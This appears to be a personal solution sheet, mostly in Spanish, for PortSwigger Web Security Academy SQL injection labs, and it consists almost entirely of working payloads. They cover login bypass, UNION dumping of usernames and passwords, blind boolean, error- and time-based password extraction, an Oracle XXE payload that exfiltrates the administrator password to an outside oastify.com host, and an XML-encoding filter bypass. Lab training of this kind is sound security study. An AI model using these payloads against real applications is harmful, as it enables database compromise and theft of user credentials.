Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-she
Hackvector: https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100


```
# Ver base de datos
SELECT schema_name FROM information_schema.schemata--

# Ver tablas 
SELECT table_name FROM information_schema.tables WHERE table_schema = '<nomberBD'--

# Ver columnas
SELECT column_name FROM information_schema.columns WHERE table_name = '<nombreTabla'
```
## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```
https://0ad5006203032eb3803071fd002e0076.web-security-academy.net/filter?category=Gifts' or 1=1 -- - 
```

## Lab: SQL injection vulnerability allowing login bypass

Username y la contraseña básia. 
```
Administrator' -- -
```

## Lab: SQL injection UNION attack, determining the number of columns returned by the query

```
https://0a3d002c035408ec825ec481002f00f0.web-security-academy.net/filter?category=Corporate+gifts' union select null,null,null -- -
```

## Lab: SQL injection UNION attack, finding a column containing text

```
https://0a68002b047df3cc81667a8300240041.web-security-academy.net/filter?category=Accessories' union select null,'A2v3JE',null -- -
```


## Lab: SQL injection UNION attack, retrieving data from other tables

```
https://0a6500ff033a2ee4809e8ad0009b00aa.web-security-academy.net/filter?category=Gifts' union select username,password from users-- -
```

## Lab: SQL injection UNION attack, retrieving multiple values in a single column

```
https://0ace003303aeb23380171765003b0089.web-security-academy.net/filter?category=Tech+gifts' union select null,username||':'||password from users -- -
```


## Lab: Blind SQL injection with conditional responses

```
Cookie: TrackingId=2vrVPVbqbmU6Fw0r' and substring((select password from users where username = 'administrator'),1,1)='a'-- -; session=lWG6EItVWRN77qyHMxloPdD5mwzo2ScY
```

## Lab: Blind SQL injection with conditional errors

Longitud de la contraseña
```
Cookie: TrackingId=OZbbwBmaJ1NuiVp' || (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || ';session=JQVmKryHEheZgvxcfaALleQbBtumUJzb
```

Encontrar el valor de la contraseña
```
Cookie: TrackingId=OZbbwBmaJ1NuiVp' || (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || ';session=JQVmKryHEheZgvxcfaALleQbBtumUJzb
```

## Lab: Visible error-based SQL injection

```
Cookie: TrackingId=' and 1=CAST((SELECT password from users limit 1) AS INT)--; session=tZco5CIyvOypZJZtY0b8WcCeB0sdv1P
```

## Lab: Blind SQL injection with time delays

```
Cookie: TrackingId=rZVcjStbgq3q8RDc' || pg_sleep(10)--; session=uS6l1xKbPxIrgSgT97Yu4bIjIF73cBfQ
```

## Lab: Blind SQL injection with time delays and information retrieval

Longitud de la contraseña
```
Cookie: TrackingId=vySy4O7UgZVs25tX' || (SELECT CASE WHEN LENGTH(password)>0 THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')--; session=FcBBAT86zkxQtifPh8dQvtHY1Ei4qkaz
```

Extraer la contraseña
```
Cookie: TrackingId=vySy4O7UgZVs25tX' || (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')--; session=FcBBAT86zkxQtifPh8dQvtHY1Ei4qkaz
```

## Lab: Blind SQL injection with out-of-band interaction

```
Cookie: TrackingId=sdfjkkas'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//r91grvmz3z4xpbfb10pfhu0b329zxqlf.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=0REKhGFYWiwXlpbU1PbAYTBab72NyZrm
```

## Lab: Blind SQL injection with out-of-band data exfiltration

```
Cookie: TrackingId=a'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username+%3d+'administrator')||'.615vjaeevewchq7qtfhu99sqvh1ep4dt.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=0REKhGFYWiwXlpbU1PbAYTBab72NyZrm
```

## Lab: SQL injection attack, querying the database type and version on Oracle

```
GET /filter?category=Gifts' UNION SELECT banner,'a' FROM v$version-- - HTTP/2
Host: 0a2d004c030438868082127100d00025.web-security-academy.net
```

## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

```
GET /filter?category=Accessories' UNION SELECT NULL,@@version-- - HTTP/2
Host: 0ac50039036530a082e906b2007e008f.web-security-academy.net
```

## Lab: SQL injection attack, listing the database contents on non-Oracle databases

Ver base de datos
```
GET /filter?category=Gifts' UNION SELECT schema_name, null FROM information_schema.schemata-- - HTTP/2
Host: 0ad500000486d9a780041211009d0071.web-security-academy.net
```

Ver tablas
```
GET /filter?category=Gifts' UNION SELECT table_name, null FROM information_schema.tables where table_schema = 'public'-- - HTTP/2
Host: 0ad500000486d9a780041211009d0071.web-security-academy.net
```

Ver columnas
```
GET /filter?category=Gifts' UNION SELECT column_name, 'a' FROM information_schema.columns WHERE table_name = 'users_qaskvr'-- - HTTP/2
Host: 0ad500000486d9a780041211009d0071.web-security-academy.net
```

Ver datos
```
GET /filter?category=Gifts' UNION SELECT username_vcsrmr, password_iybboj FROM users_qaskvr-- - HTTP/2
Host: 0ad500000486d9a780041211009d0071.web-security-academy.net
Cookie: session=lh1eUOCwPsCaAvR7md1mgiMu0TmkRCjb
```

## Lab: SQL injection attack, listing the database contents on Oracle

Ver tablas
```
GET /filter?category=Gifts' UNION SELECT table_name,'a' FROM all_tables-- HTTP/2
Host: 0a3c00a1039a873680ac08b9006d002d.web-security-academy.net
```

Ver columnas
```
GET /filter?category=Gifts' UNION SELECT column_name,'a' FROM all_tab_columns WHERE table_name = 'USERS_DRZHAH'-- HTTP/2
Host: 0a3c00a1039a873680ac08b9006d002d.web-security-academy.net
```

Ver datos
```
GET /filter?category=Gifts' UNION SELECT USERNAME_EIXUCY,PASSWORD_KXYCKO FROM USERS_DRZHAH-- HTTP/2
Host: 0a3c00a1039a873680ac08b9006d002d.web-security-academy.net
```

## Lab: SQL injection with filter bypass via XML encoding

Ver base de datos
```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 <@hex_entities>UNION SELECT schema_name FROM information_schema.schemata</@hex_entities></storeId></stockCheck>
```

Ver tablas
```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 <@hex_entities>UNION SELECT table_name FROM information_schema.tables where table_schema = 'public'</@hex_entities></storeId></stockCheck>
```

Ver columnas
```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 <@hex_entities>UNION SELECT column_name FROM information_schema.columns where table_name = 'users'</@hex_entities></storeId></stockCheck>
```

Ver datos
```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 <@hex_entities>UNION SELECT username||' : '||password FROM users</@hex_entities></storeId></stockCheck>
```
